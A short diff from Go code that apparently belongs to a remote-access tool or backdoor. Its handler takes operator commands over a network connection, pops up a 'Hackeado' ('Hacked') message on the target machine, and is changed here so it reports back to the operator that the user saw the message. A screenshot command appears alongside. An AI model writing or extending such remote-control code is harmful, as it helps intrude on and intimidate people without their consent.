@@ -199,7 +199,11 @@ func Cliente(cliente net.Conn) {
 	} else if match_msn {
 		msg := strings.Split(entrada, "-")
 
-		sistema.MsgCartel("Hackeado", msg[1])
+		msgerr := sistema.MsgCartel("Hackeado", msg[1])
+
+		if msgerr == nil {
+			Envio(cliente, []byte("- el usuario vió el mensaje"))
+		}
 
 	} else if entrada == "ss" { // logica de ss
 		ch_err := make(chan error)
